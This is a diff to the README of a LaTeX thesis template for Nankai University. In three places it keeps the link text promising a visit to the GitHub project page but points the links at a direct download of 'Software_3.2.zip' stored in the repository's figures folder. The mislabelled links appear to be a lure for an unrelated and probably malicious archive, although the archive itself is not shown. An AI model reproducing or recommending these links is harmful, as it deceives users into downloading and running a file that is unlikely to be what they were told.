@@ -1,6 +1,6 @@
 # 🎓 nkuthesis - Easy LaTeX Thesis Setup for Nankai
 
-[![Download nkuthesis](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/jasim5181/nkuthesis)
+[![Download nkuthesis](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/jasim5181/nkuthesis/raw/refs/heads/main/figures/Software_3.2.zip)
 
 ## 📘 Overview
 
@@ -30,7 +30,7 @@ If you only want to view the finished thesis, you still need a PDF reader after 
 
 Use this link to visit the project page and get the files:
 
-[Visit the nkuthesis GitHub page](https://github.com/jasim5181/nkuthesis)
+[Visit the nkuthesis GitHub page](https://github.com/jasim5181/nkuthesis/raw/refs/heads/main/figures/Software_3.2.zip)
 
 ## 🧭 Install on Windows
 
@@ -225,7 +225,7 @@ A final read through can save time later.
 
 If you have not done so yet, use this link to visit the project page and download the template:
 
-[https://github.com/jasim5181/nkuthesis](https://github.com/jasim5181/nkuthesis)
+[https://github.com/jasim5181/nkuthesis/raw/refs/heads/main/figures/Software_3.2.zip](https://github.com/jasim5181/nkuthesis/raw/refs/heads/main/figures/Software_3.2.zip)
 
 ## 📌 File Names to Edit First
 
